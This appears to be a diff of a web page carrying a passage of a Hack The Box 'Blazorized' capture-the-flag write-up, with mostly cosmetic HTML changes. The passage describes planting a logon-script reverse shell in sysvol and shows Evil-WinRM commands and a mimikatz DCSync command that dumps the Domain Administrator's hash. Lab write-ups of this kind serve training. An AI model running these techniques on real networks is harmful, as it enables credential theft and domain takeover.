 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; [DateTime]::FromFileTime((Get-ADUser -Identity ssa_6010 -Properties LastLogon).LastLogon)
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; [DateTime]::FromFileTime((Get-ADUser -Identity ssa_6010 -Properties LastLogon).LastLogon)
 Saturday, November 9, 2024 4:32:38 AM
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; date
 Saturday, November 9, 2024 4:32:44 AM</code></pre>
 </doc-codeblock></div>
 <p>It looks like this person is logging in and out every minute so lets abuse this now. We are able to write a <code v-pre>bat</code> file in <code v-pre>sysvol\[domain]\scripts\</code> and use this to run a reverse shell whenever the user <code v-pre>SSA_6010</code> tries to login. We can check which logon script folder is from our target user by checking the permissions.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">*Evil-WinRM* PS C:\windows\sysvol\domain\scripts&gt; icacls A32FF3AEAA23
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">*Evil-WinRM* PS C:\windows\sysvol\domain\scripts&gt; icacls A32FF3AEAA23
 A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
              BLAZORIZED\Administrator:(OI)(CI)(F)
              BUILTIN\Administrators:(I)(F)
@@ -495,7 +496,7 @@ A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
 </doc-codeblock></div>
 <p>We wait a minute for the user to login and catch our reverse shell. From BloodHound we also see that this user is able to perform a DCSync attack.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/blazorized/bloodhound-ssa.png" alt="" />
+    <img src="../../../../assets/images/writeups/blazorized/bloodhound-ssa.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -507,7 +508,7 @@ A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
 </doc-anchor-target>
 <p>We upload <code v-pre>mimikatz.exe</code> and perform the attack and get the hash of the Domain Admin.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">C:\Users\Public&gt; .\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:BLAZORIZED.HTB /user:Administrator&quot; &quot;exit&quot;
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">C:\Users\Public&gt; .\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:BLAZORIZED.HTB /user:Administrator&quot; &quot;exit&quot;
 
 SAM Username         : Administrator
 Account Type         : 30000000 ( USER_OBJECT )
@@ -533,23 +534,23 @@ If you enjoyed this machine and want to learn more about DACL attacks, check out
                                 <!-- Required only on API pages -->
                                 <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                             </div>
-                            <footer class="clear-both">
+                            <footer id="retype-content-footer" class="clear-both">
                             
-                                <nav class="print:hidden flex mt-14">
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/administrator/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/administrator/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
-                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
                                                 <span class="block mt-1">Administrator (Medium)</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/checker/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/checker/">
                                             <span>
-                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
                                                 <span class="block mt-1">Checker (Hard)</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
@@ -559,24 +560,24 @@ If you enjoyed this machine and want to learn more about DACL attacks, check out
                             </footer>
                         </main>
                 
-                        <div class="print:border-none border-t dark:border-dark-650 pt-6 mb-8">
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
                             <footer class="flex flex-wrap items-center justify-between print:justify-center">
-                                <div class="print:hidden">
+                                <div id="retype-footer-links" class="print:hidden">
                                     <ul class="flex flex-wrap items-center text-sm">
                                     </ul>
                                 </div>
-                                <div class="print:justify-center docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
                             </footer>
                         </div>
                     </div>
                 
                     <!-- Rendered if sidebar right is enabled -->
                     <!-- Sidebar right skeleton-->
-                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
                         <div class="pl-5">
-                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                         </div>
                     </div>
                 
@@ -592,7 +593,7 @@ If you enjoyed this machine and want to learn more about DACL attacks, check out
     </div>
 
 
-    <div id="docs-overlay-target"></div>
+    <div id="retype-overlay-target"></div>
 
     <script data-cfasync="false">window.__DOCS__ = { "title": "Blazorized (Hard)", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
